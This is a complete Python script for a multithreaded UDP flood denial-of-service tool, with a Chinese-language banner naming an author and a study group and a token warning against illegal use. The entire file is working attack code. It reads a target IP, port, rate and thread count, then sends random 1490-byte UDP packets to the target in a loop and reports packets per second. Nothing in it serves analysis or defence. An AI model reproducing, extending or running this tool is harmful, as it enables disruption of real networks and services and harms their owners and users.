import os
import time
import socket
import random
import threading
import argparse
from datetime import datetime
from typing import Tuple, Optional

class DDoSAttack:
    """UDP Flood DDoS Attack Implementation"""
    
    def __init__(self):
        """Initialize the DDoS attack tool"""
        self.sent_packets = 0
        self.running = False
        self.start_time = 0
        self.lock = threading.Lock()
    
    def display_info(self) -> None:
        """Display program information and warning"""
        os.system("clear" if os.name == "posix" else "cls")
        
        try:
            os.system("figlet DDos Attack")
        except:
            print("=" * 50)
            print("             DDos Attack Tool             ")
            print("=" * 50)
            
        print("\n/---------------------------------------------------\\")
        print("|   作者          : Andysun06                       |")
        print("|   作者github    : https://github.com/Andysun06    |")
        print("|   kali-QQ学习群 : 909533854                       |")
        print("|   版本          : V1.2.0                          |")
        print("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
        print("\\---------------------------------------------------/")
        print("\n -----------------[请勿用于违法用途]----------------- \n")
    
    def get_user_input(self) -> Tuple[str, int, int, int]:
        """Get target IP, port, attack speed, and thread count from user"""
        ip = input("请输入 IP     : ")
        
        while True:
            try:
                port = int(input("攻击端口      : "))
                if 1 <= port <= 65535:
                    break
                else:
                    print("请输入1到65535之间的有效端口")
            except ValueError:
                print("请输入一个有效的数字")
        
        while True:
            try:
                speed = int(input("攻击速度(1~1000) : "))
                if 1 <= speed <= 1000:
                    break
                else:
                    print("请输入1到1000之间的数值")
            except ValueError:
                print("请输入一个有效的数字")
        
        while True:
            try:
                threads = int(input("线程数(1~100)  : "))
                if 1 <= threads <= 100:
                    break
                else:
                    print("请输入1到100之间的数值")
            except ValueError:
                print("请输入一个有效的数字")
                
        return ip, port, speed, threads
    
    def parse_arguments(self) -> Optional[Tuple[str, int, int, int]]:
        """Parse command line arguments"""
        parser = argparse.ArgumentParser(description="UDP Flood DDoS Attack Tool")
        parser.add_argument("-t", "--target", help="Target IP address")
        parser.add_argument("-p", "--port", type=int, help="Target port")
        parser.add_argument("-s", "--speed", type=int, help="Attack speed (1-1000)")
        parser.add_argument("-n", "--threads", type=int, help="Number of threads (1-100)")
        
        args = parser.parse_args()
        
        if args.target and args.port and args.speed and args.threads:
            # Validate inputs
            if not (1 <= args.port <= 65535):
                print("端口必须在1到65535之间")
                return None
                
            if not (1 <= args.speed <= 1000):
                print("速度必须在1到1000之间")
                return None
                
            if not (1 <= args.threads <= 100):
                print("线程数必须在1到100之间")
                return None
                
            return args.target, args.port, args.speed, args.threads
        
        return None
    
    def create_socket(self) -> Tuple[socket.socket, bytes]:
        """Create UDP socket and generate random data"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Increase buffer size for better performance
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
        # Generate larger random payload for more impact
        bytes_data = random._urandom(1490)
        return sock, bytes_data
    
    def print_stats(self) -> None:
        """Print attack statistics periodically"""
        while self.running:
            time.sleep(1)
            current_packets = 0
            
            with self.lock:
                current_packets = self.sent_packets
                self.sent_packets = 0
            
            elapsed = time.time() - self.start_time
            if elapsed >= 1:
                print(f"[{datetime.now().strftime('%H:%M:%S')}] 已发送 {current_packets} 个数据包/秒")
    
    def attack_thread(self, sock: socket.socket, bytes_data: bytes, 
                     ip: str, port: int, speed: int) -> None:
        """Thread function to send packets"""
        sleep_time = (1000 - speed) / 2000
        
        try:
            while self.running:
                sock.sendto(bytes_data, (ip, port))
                
                with self.lock:
                    self.sent_packets += 1
                
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    
        except Exception as e:
            print(f"线程错误: {e}")
    
    def send_packets(self, ip: str, port: int, speed: int, num_threads: int) -> None:
        """Start multiple threads to send packets"""
        sock, bytes_data = self.create_socket()
        self.running = True
        self.start_time = time.time()
        
        # Create and start statistics thread
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Create and start attack threads
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(
                target=self.attack_thread,
                args=(sock, bytes_data, ip, port, speed)
            )
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        print(f"\n攻击已启动! 使用 {num_threads} 个线程攻击 {ip}:{port}")
        print("按 Ctrl+C 停止攻击\n")
        
        try:
            # Keep main thread alive
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print("\n攻击已停止")
            
        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=1.0)
    
    def run(self) -> None:
        """Main entry point for the program"""
        self.display_info()
        
        # Try to get arguments from command line first
        args = self.parse_arguments()
        
        if args:
            ip, port, speed, threads = args
        else:
            # If command line arguments are not provided, get from user input
            ip, port, speed, threads = self.get_user_input()
        
        self.send_packets(ip, port, speed, threads)

if __name__ == "__main__":
    attack = DDoSAttack()
    attack.run()